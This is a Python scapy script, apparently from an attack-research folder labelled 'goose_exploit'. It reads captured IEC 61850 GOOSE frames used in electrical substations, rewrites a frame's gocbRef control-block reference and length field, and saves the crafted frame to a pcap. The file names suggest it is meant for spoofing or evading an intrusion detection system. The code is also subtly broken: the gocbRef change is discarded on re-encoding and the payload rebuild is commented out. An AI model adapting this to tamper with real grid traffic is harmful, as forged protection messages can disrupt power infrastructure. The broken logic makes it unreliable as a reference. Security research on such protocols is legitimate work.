from gooseFunc import *
from scapy.all import *

GOOSE_TYPE = 0x88b8

# Load packets from the pcap file
packets = rdpcap('Attack codes\goose_exploit\ids_bust_boolean.pcapng')

g_packets = []  # List to store GOOSE packets

# Identify and collect GOOSE packets
for packet in packets:
    if goose_check(packet, GOOSE_TYPE):                                  
        g_packets.append(packet)

# Assuming g_packets has at least one GOOSE packet
if g_packets:
    # Take the first GOOSE packet for modification
    mod_packet = g_packets[0]

    # Parse the GOOSE packet using your defined structure
    mod_data = GOOSE(mod_packet.load)
    mod_pdu = mod_data[GOOSEPDU].original
    
    mod_pdu_decode = gooseAllData_decode(mod_pdu)
    mod_pdu_decode.setComponentByName('gocbRef', 'PDC02_11_700G_G1CFG/LLN0$GO$GooseDset_BF_P')
    # Modify the length field (example adding 34 bytes to length)
    new_length = len(mod_packet.load) + 34

    # Update mod_data in-place
    mod_data.length = new_length

    # Encode the modified GOOSE PDU (ASN.1/BER encoding)
    encoded_data = encoder.encode(gooseAllData_decode(mod_pdu))

    # Rebuild the modified packet (GOOSE header + modified payload + remaining data structure)
    # mod_packet.load = (
    #     struct.pack('!H', mod_data.appid) +
    #     struct.pack('!H', new_length) +
    #     struct.pack('!H', mod_data.reserved1) +
    #     struct.pack('!H', mod_data.reserved2) +
    #     encoded_data +
    #     mod_packet.load[12:]  # Assuming the rest of the packet follows the header
    # )
    

    # Print the modified packet details
    print("\nModified Frame:")
    mod_packet.show()

    # Save the modified packet to a new pcap file
    f_name = 'Attack codes\goose_exploit\solo_test.pcapng'
    wrpcap(f_name, mod_packet, append=True)

    # Verify the modified packet's length
    test_data = GOOSE(mod_packet.load)
    print(f"Modified Packet Length: {test_data.length}")

else:
    print("No GOOSE packets found in the capture file.")
